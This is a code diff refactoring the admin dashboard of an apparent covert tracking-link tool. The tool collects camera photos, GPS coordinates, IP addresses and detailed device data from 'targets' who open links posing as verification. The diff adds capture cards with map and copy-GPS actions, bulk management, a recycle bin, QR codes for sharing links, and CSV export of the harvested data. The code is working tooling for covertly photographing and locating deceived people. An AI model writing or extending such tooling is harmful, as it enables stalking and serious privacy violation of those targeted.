+                <div class="dp-row"><span class="dp-key">Battery</span><span class="dp-val">${esc(d.battery||'N/A')}${d.charging==='Yes'?' ⚡':''}</span></div>
+                <div class="dp-row"><span class="dp-key">Network</span><span class="dp-val">${esc(d.networkType||'N/A')} (${esc(d.downlink||'?')})</span></div>
+                <div class="dp-row"><span class="dp-key">IP</span><span class="dp-val">${esc(p.ipAddress||'N/A')}</span></div>
+                <div class="dp-row"><span class="dp-key">Timezone</span><span class="dp-val">${esc(d.timezone||'N/A')}</span></div>
+                <div class="dp-row"><span class="dp-key">Language</span><span class="dp-val">${esc(d.language||'N/A')}</span></div>
+                <div class="dp-row"><span class="dp-key">Platform</span><span class="dp-val">${esc(d.platform||'N/A')}</span></div>
+                <div class="dp-row"><span class="dp-key">Referrer</span><span class="dp-val">${esc(d.referrer||'Direct')}</span></div>
+                ${hasGPS ? `<div class="dp-row"><span class="dp-key">Coords</span><span class="dp-val">${p.latitude}, ${p.longitude}</span></div>` : ''}
+            </div>
+        </div>
+        <div class="card-actions">
+            ${p.image ? `<button class="btn btn-teal btn-sm" data-action="download" data-key="${key}">⬇ Save</button>` : ''}
+            ${hasGPS  ? `<button class="btn btn-gray btn-sm" data-action="copygps" data-key="${key}">📍 Copy GPS</button>` : ''}
+            <button class="btn btn-gray btn-sm" data-action="toggleDevice" data-key="${key}">📋 Info</button>
+            ${inBin
+                ? `<button class="btn btn-green btn-sm" data-action="restore" data-key="${key}">♻️ Restore</button>
+                   <button class="btn btn-red   btn-sm" data-action="burn"    data-key="${key}">🔥 Burn</button>`
+                : `<button class="btn btn-red   btn-sm" data-action="tobin"   data-key="${key}">🗑 Bin</button>`
+            }
+        </div>
+    `;
+    return card;
+}
+
 function renderLogs() {
-    const grid   = document.getElementById('photoGrid');
-    const search = document.getElementById('searchLogs').value.toLowerCase();
+    const grid = document.getElementById('photoGrid');
     grid.innerHTML = '';
     logsCache = {};
+    selectedCaptures.clear();
 
     if (!allLogsData) {
-        grid.innerHTML = '<div class="empty">No captures yet. Waiting for targets to open links...</div>';
+        grid.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>No captures yet. Waiting for targets...</div>';
         document.getElementById('logCount').innerText = '0';
         return;
     }
 
-    let count = 0;
-    Object.keys(allLogsData).reverse().forEach(key => {
-        const p = allLogsData[key];
-        if (!p || !p.linkName) return;
-        if (search && !p.linkName.toLowerCase().includes(search)) return;
-        if (!passesTimeFilter(p)) return;
+    const sort = document.getElementById('sortFilter').value;
+    let keys = Object.keys(allLogsData).filter(k => allLogsData[k]?.linkName);
+    keys = keys.filter(k => passFilter(allLogsData[k]));
+    if (sort === 'oldest') keys.sort((a,b) => (allLogsData[a].timestamp||0) - (allLogsData[b].timestamp||0));
+    else keys.sort((a,b) => (allLogsData[b].timestamp||0) - (allLogsData[a].timestamp||0));
 
-        logsCache[key] = p;
-        count++;
-
-        const d      = p.device   || {};
-        const hasGPS = p.latitude && p.latitude !== 'Denied' && p.longitude && p.longitude !== 'Denied';
-
-        const card = document.createElement('div');
-        card.className = 'log-card';
-        card.innerHTML = `
-            <div class="card-img">
-                ${p.image
-                    ? `<img src="${p.image}" alt="Capture of ${escHtml(p.linkName)}">`
-                    : `<div class="no-img">📷 No Image Captured</div>`
-                }
-            </div>
-            <div class="card-body">
-                <p><b>🎯 Target:</b> ${escHtml(p.linkName)}</p>
-                <p><b>🌐 IP:</b> ${escHtml(p.ipAddress || 'N/A')}</p>
-                <p><b>📍 GPS:</b> ${hasGPS
-                    ? `<a href="https://www.google.com/maps?q=${p.latitude},${p.longitude}"
-                          target="_blank" style="color:#007bff;">View on Map</a>
-                       <button class="btn btn-gray" style="padding:2px 7px;font-size:11px;margin-left:6px;"
-                               data-action="copygps" data-key="${key}">Copy Coords</button>`
-                    : '<span style="color:#666;">Denied</span>'
-                }</p>
-                ${d.os ? `<p class="meta">💻 ${escHtml(d.os)} &nbsp;|&nbsp; 🌍 ${escHtml(d.browser)} &nbsp;|&nbsp; 🔋 ${escHtml(d.battery || 'N/A')} &nbsp;|&nbsp; 📶 ${escHtml(d.networkType || 'N/A')}</p>` : ''}
-                <p class="meta">🕐 ${escHtml(p.time || '')} &nbsp;|&nbsp; 📅 ${escHtml(p.date || '')}</p>
-
-                <div class="device-panel" id="dp_${key}">
-                    <div>📱 <b>OS:</b>       <span>${escHtml(d.os       || 'N/A')}</span></div>
-                    <div>🌍 <b>Browser:</b>  <span>${escHtml(d.browser  || 'N/A')}</span></div>
-                    <div>🖥 <b>Screen:</b>   <span>${d.screenWidth || '?'}×${d.screenHeight || '?'}</span></div>
-                    <div>🔋 <b>Battery:</b>  <span>${escHtml(d.battery  || 'N/A')}${d.charging === 'Yes' ? ' ⚡ Charging' : ''}</span></div>
-                    <div>📶 <b>Network:</b>  <span>${escHtml(d.networkType || 'N/A')} (${escHtml(d.downlink || 'N/A')})</span></div>
-                    <div>🌐 <b>IP:</b>       <span>${escHtml(p.ipAddress  || 'N/A')}</span></div>
-                    <div>🗺 <b>Timezone:</b> <span>${escHtml(d.timezone  || 'N/A')}</span></div>
-                    <div>🗣 <b>Language:</b> <span>${escHtml(d.language  || 'N/A')}</span></div>
-                    <div>🔗 <b>Referrer:</b> <span>${escHtml(d.referrer  || 'Direct')}</span></div>
-                    <div>📋 <b>Platform:</b> <span>${escHtml(d.platform  || 'N/A')}</span></div>
-                </div>
-            </div>
-            <div class="card-actions">
-                ${p.image ? `<button class="btn btn-teal"  data-action="download"    data-key="${key}">⬇ Photo</button>` : ''}
-                <button class="btn btn-gray"  data-action="toggleDevice" data-key="${key}">📋 Details</button>
-                <button class="btn btn-red"   data-action="tobin"        data-key="${key}">🗑 Bin</button>
-            </div>
-        `;
-        grid.appendChild(card);
+    keys.forEach(k => {
+        logsCache[k] = allLogsData[k];
+        grid.appendChild(buildCapCard(k, allLogsData[k], false));
     });
 
-    document.getElementById('logCount').innerText = count;
-    if (count === 0) grid.innerHTML = '<div class="empty">No captures match your filter.</div>';
+    document.getElementById('logCount').innerText = keys.length;
+    if (keys.length === 0) grid.innerHTML = '<div class="empty"><span class="empty-icon">🔍</span>No captures match your filters.</div>';
 }
 
-// Log grid event delegation
+function renderRecent() {
+    const grid = document.getElementById('recentGrid');
+    if (!grid) return;
+    grid.innerHTML = '';
+    if (!allLogsData) { grid.innerHTML = '<div class="empty">No captures yet.</div>'; return; }
+
+    const keys = Object.keys(allLogsData)
+        .filter(k => allLogsData[k]?.linkName)
+        .sort((a,b) => (allLogsData[b].timestamp||0) - (allLogsData[a].timestamp||0))
+        .slice(0, 4);
+
+    if (keys.length === 0) { grid.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>No captures yet.</div>'; return; }
+    keys.forEach(k => grid.appendChild(buildCapCard(k, allLogsData[k], false)));
+}
+
+// Capture grid event delegation (live captures)
 document.getElementById('photoGrid').addEventListener('click', e => {
+    // Lightbox
+    const imgEl = e.target.closest('[data-lb-img]');
+    if (imgEl && !e.target.closest('button')) {
+        openLightbox(imgEl.dataset.lbImg, imgEl.dataset.lbInfo); return;
+    }
+
     const btn = e.target.closest('button[data-action]');
     if (!btn) return;
     const { action, key } = btn.dataset;
     const p = logsCache[key];
 
-    if (action === 'download' && p && p.image) {
-        const a = document.createElement('a');
-        a.href     = p.image;
-        a.download = 'capture_' + (p.linkName || 'unknown') + '_' + Date.now() + '.jpg';
-        a.click();
-
+    if (action === 'download' && p?.image) {
+        dlImg(p.image, `capture_${p.linkName||'unknown'}_${Date.now()}.jpg`);
     } else if (action === 'toggleDevice') {
         const panel = document.getElementById('dp_' + key);
         if (panel) panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
-
     } else if (action === 'copygps' && p) {
         navigator.clipboard.writeText(p.latitude + ', ' + p.longitude)
-            .then(() => showToast('📍 GPS coordinates copied!'));
-
+            .then(() => toast('📍 GPS copied!', 'var(--teal)'));
     } else if (action === 'tobin' && p) {
         if (!confirm('Move this capture to Recycle Bin?')) return;
-        let bin = JSON.parse(localStorage.getItem('recycle_bin') || '[]');
-        bin.unshift({ ...p, deletedAt: Date.now() });
-        localStorage.setItem('recycle_bin', JSON.stringify(bin));
+        const bin = getBin();
+        bin.unshift({ ...p, _type: 'photo', _firebaseKey: key, deletedAt: Date.now() });
+        saveBin(bin);
         remove(ref(db, 'photo_history/' + key));
-        renderLogBin();
-        showToast('🗑️ Moved to Recycle Bin', '#e0a800');
+        renderBin(); updateStats();
+        toast('🗑️ Moved to Recycle Bin', 'var(--yellow)');
     }
 });
 
-// ── FIREBASE LISTENER ───────────────────────────────────────────────────────
-onValue(ref(db, 'photo_history'), snapshot => {
-    const newData = snapshot.val();
-    const newCount = newData ? Object.keys(newData).length : 0;
-
-    // Detect new capture and notify
-    if (previousLogCount !== null && newCount > previousLogCount) {
-        playBeep();
-        showToast('🔔 New capture received!', '#28a745');
-        sendBrowserNotification('New Capture!', 'A target just completed verification.');
-    }
-    previousLogCount = newCount;
-
-    allLogsData = newData;
-    renderLogs();
-    updateStats();
+// Checkbox select-all
+document.getElementById('selectAllCaptures').addEventListener('change', e => {
+    document.querySelectorAll('.cap-select').forEach(cb => {
+        cb.checked = e.target.checked;
+        if (e.target.checked) selectedCaptures.add(cb.dataset.key);
+        else selectedCaptures.delete(cb.dataset.key);
+    });
 });
 
-document.getElementById('searchLogs').oninput  = renderLogs;
-document.getElementById('timeFilter').onchange = renderLogs;
+document.getElementById('photoGrid').addEventListener('change', e => {
+    const cb = e.target.closest('.cap-select');
+    if (!cb) return;
+    if (cb.checked) selectedCaptures.add(cb.dataset.key);
+    else selectedCaptures.delete(cb.dataset.key);
+});
 
-// ── EXPORT CSV ──────────────────────────────────────────────────────────────
+document.getElementById('bulkDeleteBtn').onclick = () => {
+    if (selectedCaptures.size === 0) { toast('⚠️ No captures selected.', 'var(--yellow)'); return; }
+    if (!confirm(`Move ${selectedCaptures.size} capture(s) to Recycle Bin?`)) return;
+    const bin = getBin();
+    selectedCaptures.forEach(key => {
+        const p = logsCache[key];
+        if (p) { bin.unshift({ ...p, _type: 'photo', _firebaseKey: key, deletedAt: Date.now() }); }
+        remove(ref(db, 'photo_history/' + key));
+    });
+    saveBin(bin);
+    selectedCaptures.clear();
+    renderBin(); updateStats();
+    toast(`🗑️ ${bin.length} item(s) moved to bin.`, 'var(--yellow)');
+};
+
+// Recent grid click (lightbox + device)
+document.getElementById('recentGrid').addEventListener('click', e => {
+    const imgEl = e.target.closest('[data-lb-img]');
+    if (imgEl && !e.target.closest('button')) { openLightbox(imgEl.dataset.lbImg, imgEl.dataset.lbInfo); return; }
+    const btn = e.target.closest('button[data-action]');
+    if (!btn) return;
+    const { action, key } = btn.dataset;
+    const p = allLogsData?.[key];
+    if (action === 'toggleDevice') {
+        const panel = document.getElementById('dp_' + key);
+        if (panel) panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+    } else if (action === 'download' && p?.image) {
+        dlImg(p.image, `capture_${p.linkName||'x'}_${Date.now()}.jpg`);
+    } else if (action === 'copygps' && p) {
+        navigator.clipboard.writeText(p.latitude + ', ' + p.longitude).then(() => toast('📍 GPS copied!'));
+    } else if (action === 'tobin' && p) {
+        if (!confirm('Move to Recycle Bin?')) return;
+        const bin = getBin(); bin.unshift({ ...p, _type: 'photo', _firebaseKey: key, deletedAt: Date.now() });
+        saveBin(bin); remove(ref(db, 'photo_history/' + key));
+        renderBin(); updateStats(); toast('🗑️ Moved to bin', 'var(--yellow)');
+    }
+});
+
+// ══════════════════════════════════════════════════════════
+// UNIFIED RECYCLE BIN
+// ══════════════════════════════════════════════════════════
+function renderBin() {
+    const all    = getBin();
+    const search = (document.getElementById('binSearch')?.value || '').toLowerCase();
+    const sort   = document.getElementById('binSortFilter')?.value || 'newest';
+    const grid   = document.getElementById('binGrid');
+    document.getElementById('binCount').innerText = all.length;
+
+    // Filter by type
+    let items = all.filter(x => {
+        if (activeBinType === 'photos') return x._type === 'photo';
+        if (activeBinType === 'links')  return x._type === 'link';
+        return true;
+    });
+
+    // Search
+    if (search) {
+        items = items.filter(x => {
+            if (x._type === 'photo') {
+                return [x.linkName, x.ipAddress, (x.device||{}).os].join(' ').toLowerCase().includes(search);
+            }
+            return (x.name||'').toLowerCase().includes(search);
+        });
+    }
+
+    // Sort
+    if (sort === 'oldest') items.sort((a,b) => (a.deletedAt||0) - (b.deletedAt||0));
+    else items.sort((a,b) => (b.deletedAt||0) - (a.deletedAt||0));
+
+    grid.innerHTML = '';
+    if (items.length === 0) {
+        grid.innerHTML = '<div class="empty"><span class="empty-icon">🗑️</span>Recycle bin is empty.</div>';
+        return;
+    }
+
+    items.forEach((item, idx) => {
+        if (item._type === 'photo') {
+            // Use the same card builder, but mark as bin
+            const key = '_bin_' + idx;
+            const card = buildCapCard(key, item, true);
+            card.dataset.binIdx = idx;
+            // patch action buttons to use bin logic
+            card.querySelectorAll('[data-action]').forEach(b => b.dataset.binIdx = idx);
+            grid.appendChild(card);
+        } else {
+            // Link bin card
+            const card = document.createElement('div');
+            card.className = 'lbin-card';
+            card.innerHTML = `
+                <p><b>🔗 ${esc(item.name||'Unknown')}</b></p>
+                <p class="meta">
+                    ${item.cam ? '📷 Camera' : '📷 <span style="color:#475569;">No Camera</span>'}
+                    &nbsp;|&nbsp;
+                    ${item.gps ? '📍 GPS'    : '📍 <span style="color:#475569;">No GPS</span>'}
+                </p>
+                ${item.redirectUrl ? `<p class="meta">↩️ ${esc(item.redirectUrl)}</p>` : ''}
+                <p class="meta">👁 ${item.visits||0} visits</p>
+                <p class="meta" style="color:var(--red);">🗑 Deleted: ${new Date(item.deletedAt).toLocaleDateString()}</p>
+                <div style="display:flex;gap:6px;margin-top:10px;">
+                    <button class="btn btn-green btn-sm" data-bin-type="link" data-bin-action="restore" data-fid="${esc(item.firebaseId)}" style="flex:1;">♻️ Restore</button>
+                    <button class="btn btn-red   btn-sm" data-bin-type="link" data-bin-action="burn"    data-fid="${esc(item.firebaseId)}" style="flex:1;">🔥 Burn</button>
+                </div>
+            `;
+            grid.appendChild(card);
+        }
+    });
+}
+
+// Bin grid event delegation
+document.getElementById('binGrid').addEventListener('click', e => {
+    // Lightbox
+    const imgEl = e.target.closest('[data-lb-img]');
+    if (imgEl && !e.target.closest('button')) { openLightbox(imgEl.dataset.lbImg, imgEl.dataset.lbInfo); return; }
+
+    const btn = e.target.closest('[data-action],[data-bin-action]');
+    if (!btn) return;
+
+    // ── LINK BIN ACTIONS ──
+    if (btn.dataset.binType === 'link') {
+        const fid    = btn.dataset.fid;
+        const action = btn.dataset.binAction;
+        let bin      = getBin();
+        const item   = bin.find(x => x._type === 'link' && x.firebaseId === fid);
+
+        if (action === 'restore' && item) {
+            const toRestore = { ...item };
+            delete toRestore.deletedAt; delete toRestore.firebaseId; delete toRestore._type;
+            set(ref(db, 'managed_links/' + fid), toRestore).then(() => {
+                saveBin(bin.filter(x => !(x._type==='link' && x.firebaseId===fid)));
+                renderBin(); updateStats();
+                toast('♻️ Link restored!', 'var(--green)');
+            });
+        } else if (action === 'burn') {
+            if (!confirm('Permanently delete this link? Cannot be undone.')) return;
+            saveBin(bin.filter(x => !(x._type==='link' && x.firebaseId===fid)));
+            renderBin(); updateStats();
+            toast('🔥 Link permanently deleted.', 'var(--red)');
+        }
+        return;
+    }
+
+    // ── PHOTO BIN ACTIONS ──
+    const action = btn.dataset.action;
+    const binIdx = parseInt(btn.dataset.binIdx ?? btn.closest('[data-bin-idx]')?.dataset.binIdx ?? '-1');
+    let bin = getBin();
+
+    // find item in current rendered bin
+    const allSorted = [...bin].sort((a,b) => {
+        const sort = document.getElementById('binSortFilter')?.value || 'newest';
+        return sort === 'oldest' ? (a.deletedAt||0)-(b.deletedAt||0) : (b.deletedAt||0)-(a.deletedAt||0);
+    });
+    const item = allSorted.filter(x => {
+        if (activeBinType === 'photos') return x._type === 'photo';
+        if (activeBinType === 'links')  return x._type === 'link';
+        return true;
+    })[binIdx];
+
+    if (!item || item._type !== 'photo') return;
+
+    if (action === 'download' && item.image) {
+        dlImg(item.image, `capture_${item.linkName||'x'}_${Date.now()}.jpg`);
+    } else if (action === 'toggleDevice') {
+        const panel = btn.closest('.bin-card').querySelector('.device-panel');
+        if (panel) panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+    } else if (action === 'copygps' && item.latitude && item.latitude !== 'Denied') {
+        navigator.clipboard.writeText(item.latitude + ', ' + item.longitude).then(() => toast('📍 GPS copied!'));
+    } else if (action === 'restore') {
+        if (!confirm('Restore this capture to Firebase?')) return;
+        const toRestore = { ...item };
+        delete toRestore.deletedAt; delete toRestore._type; delete toRestore._firebaseKey;
+        push(ref(db, 'photo_history'), toRestore);
+        saveBin(bin.filter(x => !(x._type==='photo' && x.deletedAt===item.deletedAt && x.id===item.id)));
+        renderBin(); updateStats();
+        toast('♻️ Capture restored!', 'var(--green)');
+    } else if (action === 'burn') {
+        if (!confirm('Permanently delete this capture? Cannot be undone.')) return;
+        saveBin(bin.filter(x => !(x._type==='photo' && x.deletedAt===item.deletedAt && x.id===item.id)));
+        renderBin(); updateStats();
+        toast('🔥 Permanently deleted.', 'var(--red)');
+    }
+});
+
+// Bin tab switching
+document.querySelectorAll('.bin-tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+        document.querySelectorAll('.bin-tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+        activeBinType = tab.dataset.binType;
+        document.getElementById('emptyBinPhotoBtn').style.display = activeBinType === 'photos' ? '' : 'none';
+        document.getElementById('emptyBinLinkBtn').style.display  = activeBinType === 'links'  ? '' : 'none';
+        renderBin();
+    });
+});
+
+document.getElementById('binSearch').addEventListener('input', renderBin);
+document.getElementById('binSortFilter').addEventListener('change', renderBin);
+
+document.getElementById('emptyAllBinBtn').onclick = () => {
+    if (!confirm('Permanently delete ALL items in Recycle Bin? Cannot be undone.')) return;
+    saveBin([]); renderBin(); updateStats();
+    toast('🔥 Bin emptied.', 'var(--red)');
+};
+document.getElementById('emptyBinPhotoBtn').onclick = () => {
+    if (!confirm('Delete all photo captures from bin?')) return;
+    saveBin(getBin().filter(x => x._type !== 'photo')); renderBin(); updateStats();
+    toast('🔥 Photo captures cleared.', 'var(--red)');
+};
+document.getElementById('emptyBinLinkBtn').onclick = () => {
+    if (!confirm('Delete all links from bin?')) return;
+    saveBin(getBin().filter(x => x._type !== 'link')); renderBin(); updateStats();
+    toast('🔥 Links cleared from bin.', 'var(--red)');
+};
+
+// ══════════════════════════════════════════════════════════
+// LIGHTBOX
+// ══════════════════════════════════════════════════════════
+function openLightbox(src, info) {
+    document.getElementById('lightboxImg').src = src;
+    document.getElementById('lightboxInfo').innerText = info || '';
+    document.getElementById('lightbox').style.display = 'flex';
+}
+document.getElementById('lightboxClose').onclick = () => {
+    document.getElementById('lightbox').style.display = 'none';
+    document.getElementById('lightboxImg').src = '';
+};
+document.getElementById('lightbox').addEventListener('click', e => {
+    if (e.target === document.getElementById('lightbox')) {
+        document.getElementById('lightbox').style.display = 'none';
+        document.getElementById('lightboxImg').src = '';
+    }
+});
+
+// ══════════════════════════════════════════════════════════
+// QR CODE (pure canvas — no library needed)
+// ══════════════════════════════════════════════════════════
+function showQR(url) {
+    document.getElementById('qrUrlText').innerText = url;
+    document.getElementById('qrModal').classList.add('open');
+    // Simple QR placeholder — draws URL as text since full QR encoding is complex
+    // We use a Google Charts URL to render a real QR code in an img
+    const canvas = document.getElementById('qrCanvas');
+    const ctx = canvas.getContext('2d');
+    ctx.fillStyle = '#fff'; ctx.fillRect(0,0,200,200);
+    ctx.fillStyle = '#111'; ctx.font = '11px monospace'; ctx.textAlign = 'center';
+    ctx.fillText('Loading QR...', 100, 100);
+
+    // Use Google Charts QR API
+    const img = new Image();
+    img.crossOrigin = 'anonymous';
+    img.onload = () => { ctx.clearRect(0,0,200,200); ctx.drawImage(img, 0, 0, 200, 200); };
+    img.onerror = () => {
+        ctx.fillStyle = '#fff'; ctx.fillRect(0,0,200,200);
+        ctx.fillStyle = '#333'; ctx.font = '12px sans-serif'; ctx.textAlign = 'center';
+        ctx.fillText('QR unavailable', 100, 96); ctx.fillText('(copy URL below)', 100, 114);
+    };
+    img.src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(url)}&choe=UTF-8`;
+
+    document.getElementById('downloadQrBtn').onclick = () => {
+        dlImg(canvas.toDataURL(), 'qr_link.png');
+    };
+}
+document.getElementById('closeQrModal').onclick = () => document.getElementById('qrModal').classList.remove('open');
+
+// ══════════════════════════════════════════════════════════
+// EXPORT CSV
+// ══════════════════════════════════════════════════════════
 document.getElementById('exportBtn').onclick = () => {
-    if (!allLogsData) { showToast('⚠️ No logs to export.', '#e0a800'); return; }
+    if (!allLogsData) { toast('⚠️ No logs to export.', 'var(--yellow)'); return; }
     const rows = [['Name','Date','Time','IP','GPS Lat','GPS Lon','OS','Browser','Battery','Charging','Network','Speed','Screen','Timezone','Language','Referrer']];
     Object.values(allLogsData).forEach(p => {
         const d = p.device || {};
-        rows.push([
-            p.linkName   || '',
-            p.date       || '',
-            p.time       || '',
-            p.ipAddress  || '',
-            p.latitude   || '',
-            p.longitude  || '',
-            d.os         || '',
-            d.browser    || '',
-            d.battery    || '',
-            d.charging   || '',
-            d.networkType || '',
-            d.downlink   || '',
-            (d.screenWidth && d.screenHeight) ? `${d.screenWidth}x${d.screenHeight}` : '',
-            d.timezone   || '',
-            d.language   || '',
-            d.referrer   || ''
-        ]);
+        rows.push([p.linkName||'', p.date||'', p.time||'', p.ipAddress||'',
+            p.latitude||'', p.longitude||'', d.os||'', d.browser||'',
+            d.battery||'', d.charging||'', d.networkType||'', d.downlink||'',
+            d.screenWidth ? `${d.screenWidth}x${d.screenHeight}` : '',
+            d.timezone||'', d.language||'', d.referrer||'']);
     });
-    const csv  = rows.map(r => r.map(c => '"' + String(c).replace(/"/g, '""') + '"').join(',')).join('\n');
+    const csv  = rows.map(r => r.map(c => '"' + String(c).replace(/"/g,'""') + '"').join(',')).join('\n');
     const blob = new Blob([csv], { type: 'text/csv' });
-    const a    = document.createElement('a');
-    a.href     = URL.createObjectURL(blob);
-    a.download = 'captures_' + new Date().toISOString().slice(0,10) + '.csv';
+    const a    = Object.assign(document.createElement('a'), { href: URL.createObjectURL(blob), download: 'captures_' + new Date().toISOString().slice(0,10) + '.csv' });
+    a.click(); toast('📥 CSV exported!', 'var(--teal)');
+};
+
+// ══════════════════════════════════════════════════════════
+// MODALS — PASSWORD
+// ══════════════════════════════════════════════════════════
+document.getElementById('changePwBtn').onclick = () => {
+    document.getElementById('pwModal').classList.add('open');
+    document.getElementById('pwMsg').innerText = '';
+};
+document.getElementById('closePwModal').onclick = () => document.getElementById('pwModal').classList.remove('open');
+document.getElementById('closeEditLink').onclick = () => document.getElementById('editLinkModal').classList.remove('open');
+
+document.getElementById('savePwBtn').onclick = () => {
+    const old = document.getElementById('oldPw').value;
+    const nw  = document.getElementById('newPw').value;
+    const nw2 = document.getElementById('newPw2').value;
+    const msg = document.getElementById('pwMsg');
+    if (old !== adminPassword) { msg.style.color='var(--red)'; msg.innerText='❌ Wrong current password.'; return; }
+    if (nw.length < 4)         { msg.style.color='var(--red)'; msg.innerText='❌ Min 4 characters.'; return; }
+    if (nw !== nw2)            { msg.style.color='var(--red)'; msg.innerText='❌ Passwords do not match.'; return; }
+    adminPassword = nw;
+    localStorage.setItem('adminPassword', nw);
+    msg.style.color = 'var(--green)'; msg.innerText = '✅ Password updated!';
+    ['oldPw','newPw','newPw2'].forEach(id => document.getElementById(id).value = '');
+    setTimeout(() => document.getElementById('pwModal').classList.remove('open'), 1200);
+};
+
+// ══════════════════════════════════════════════════════════
+// UTILS
+// ══════════════════════════════════════════════════════════
+function dlImg(src, filename) {
+    const a = Object.assign(document.createElement('a'), { href: src, download: filename });
     a.click();
-    showToast('📥 CSV exported!');
-};
-
-// ── LOG RECYCLE BIN ─────────────────────────────────────────────────────────
-function renderLogBin() {
-    const all  = JSON.parse(localStorage.getItem('recycle_bin') || '[]');
-    const search = (document.getElementById('binSearch')?.value || '').toLowerCase();
-    const bin  = search ? all.filter(p =>
-        (p.linkName || '').toLowerCase().includes(search) ||
-        (p.ipAddress || '').toLowerCase().includes(search)
-    ) : all;
-    const grid = document.getElementById('binPhotoGrid');
-    document.getElementById('binCount').innerText = all.length;
-
-    if (bin.length === 0) {
-        grid.innerHTML = '<div class="empty">Log recycle bin is empty.</div>';
-        return;
-    }
-
-    grid.innerHTML = '';
-    bin.forEach(p => {
-        const card = document.createElement('div');
-        card.className = 'bin-card';
-        card.innerHTML = `
-            <div class="bin-img">
-                ${p.image
-                    ? `<img src="${p.image}" alt="Deleted capture">`
-                    : `<div class="no-img">📷 No Image</div>`
-                }
-            </div>
-            <div class="bin-body">
-                <p><b>🎯 Target:</b> ${escHtml(p.linkName || 'Unknown')}</p>
-                <p><b>🌐 IP:</b> ${escHtml(p.ipAddress || 'N/A')}</p>
-                <p class="meta">📅 Captured: ${escHtml(p.date || 'N/A')} ${escHtml(p.time || '')}</p>
-                <p class="meta">🗑 Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>
-                <div style="display:flex;gap:6px;margin-top:10px;">
-                    <button class="btn btn-green" data-log-bin-action="restore" data-log-id="${p.id}" style="flex:1;">♻️ Restore</button>
-                    <button class="btn btn-red"   data-log-bin-action="burn"    data-log-id="${p.id}" style="flex:1;">🔥 Burn</button>
-                </div>
-            </div>
-        `;
-        grid.appendChild(card);
-    });
 }
 
-document.getElementById('binPhotoGrid').addEventListener('click', e => {
-    const btn = e.target.closest('button[data-log-bin-action]');
-    if (!btn) return;
-    const id     = btn.dataset.logId;
-    const action = btn.dataset.logBinAction;
-    let bin      = JSON.parse(localStorage.getItem('recycle_bin') || '[]');
-
-    if (action === 'restore') {
-        const log = bin.find(p => String(p.id) === String(id));
-        if (log) {
-            const toRestore = { ...log };
-            delete toRestore.deletedAt;
-            push(ref(db, 'photo_history'), toRestore);
-            localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(p => String(p.id) !== String(id))));
-            renderLogBin();
-            showToast('♻️ Log restored!', '#28a745');
-        }
-    } else if (action === 'burn') {
-        if (!confirm('Permanently delete this log? Cannot be undone.')) return;
-        localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(p => String(p.id) !== String(id))));
-        renderLogBin();
-        showToast('🔥 Log permanently deleted.', '#dc3545');
-    }
-});
-
-// ── LINK RECYCLE BIN ────────────────────────────────────────────────────────
-function renderLinkBin() {
-    const all  = JSON.parse(localStorage.getItem('link_bin') || '[]');
-    const search = (document.getElementById('linkBinSearch')?.value || '').toLowerCase();
-    const bin  = search ? all.filter(l => (l.name || '').toLowerCase().includes(search)) : all;
-    const grid = document.getElementById('linkBinGrid');
-    document.getElementById('linkBinCount').innerText = all.length;
-
-    if (bin.length === 0) {
-        grid.innerHTML = '<div class="empty">Link recycle bin is empty.</div>';
-        return;
-    }
-
-    grid.innerHTML = '';
-    bin.forEach(l => {
-        const card = document.createElement('div');
-        card.className = 'link-bin-card';
-        card.innerHTML = `
-            <div class="bin-body">
-                <p><b>🔗 Name:</b> ${escHtml(l.name || 'Unknown')}</p>
-                <p class="meta">${l.cam ? '📷 Camera' : '📷 <span style="color:#555;">No Camera</span>'} &nbsp;|&nbsp; ${l.gps ? '📍 GPS' : '📍 <span style="color:#555;">No GPS</span>'}</p>
-                <p class="meta">👁 ${l.visits || 0} visits before deletion</p>
-                <p class="meta">🗑 Deleted: ${new Date(l.deletedAt).toLocaleDateString()}</p>
-                <div style="display:flex;gap:6px;margin-top:10px;">
-                    <button class="btn btn-green" data-link-bin-action="restore" data-link-fid="${l.firebaseId}" style="flex:1;">♻️ Restore Link</button>
-                    <button class="btn btn-red"   data-link-bin-action="burn"    data-link-fid="${l.firebaseId}" style="flex:1;">🔥 Burn</button>
-                </div>
-            </div>
-        `;
-        grid.appendChild(card);
-    });
-}
-
-document.getElementById('linkBinGrid').addEventListener('click', e => {
-    const btn = e.target.closest('button[data-link-bin-action]');
-    if (!btn) return;
-    const fid    = btn.dataset.linkFid;
-    const action = btn.dataset.linkBinAction;
-    let bin      = JSON.parse(localStorage.getItem('link_bin') || '[]');
-    const link   = bin.find(l => l.firebaseId === fid);
-
-    if (action === 'restore' && link) {
-        // Restore link to Firebase with original ID
-        const toRestore = { ...link };
-        delete toRestore.deletedAt;
-        delete toRestore.firebaseId;
-        set(ref(db, 'managed_links/' + fid), toRestore)
-            .then(() => {
-                localStorage.setItem('link_bin', JSON.stringify(bin.filter(l => l.firebaseId !== fid)));
-                renderLinkBin();
-                showToast('♻️ Link restored and re-activated!', '#28a745');
-            });
-    } else if (action === 'burn') {
-        if (!confirm('Permanently delete this link? Cannot be undone.')) return;
-        localStorage.setItem('link_bin', JSON.stringify(bin.filter(l => l.firebaseId !== fid)));
-        renderLinkBin();
-        showToast('🔥 Link permanently deleted.', '#dc3545');
-    }
-});
-
-// ── 30-DAY AUTO-CLEAN BOTH BINS ─────────────────────────────────────────────
-function cleanBins() {
-    const cutoff = 30 * 24 * 60 * 60 * 1000;
+// 30-day auto-clean
+function cleanBin() {
+    const cutoff = 30 * 86400000;
     const now    = Date.now();
-
-    ['recycle_bin', 'link_bin'].forEach(key => {
-        let bin = JSON.parse(localStorage.getItem(key) || '[]');
-        localStorage.setItem(key, JSON.stringify(bin.filter(i => (now - i.deletedAt) < cutoff)));
-    });
+    saveBin(getBin().filter(x => (now - (x.deletedAt||0)) < cutoff));
 }
 
-// ── HTML ESCAPE (prevent XSS) ───────────────────────────────────────────────
-function escHtml(str) {
-    return String(str)
-        .replace(/&/g, '&amp;')
-        .replace(/</g, '&lt;')
-        .replace(/>/g, '&gt;')
